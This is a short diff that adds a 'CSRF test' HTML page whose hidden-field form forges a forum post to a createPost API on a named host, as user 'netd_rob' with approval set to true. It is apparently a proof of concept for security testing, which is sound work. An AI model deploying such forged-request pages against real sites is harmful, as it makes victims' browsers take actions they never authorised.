@@ -4,6 +4,15 @@
     <title>CSRF test</title>
   </head>
   <body>
-    
+    <form action="http://austinvm38.netdimensions.com/api/forum/createPost" method="POST">
+      <input name="postId" type="hidden" value="0">
+      <input name="userId" type="hidden" value="netd_rob">
+      <input name="clientName" type="hidden" value="interactive">
+      <input name="regionId" type="hidden" value="4">
+      <input name="topicId" type="hidden" value="6">
+      <input name="approved" type="hidden" value="true">
+      <input name="content" type="hidden" value="Posted without authorization">
+      <input type="submit">
+    </form>
   </body>
 </html>
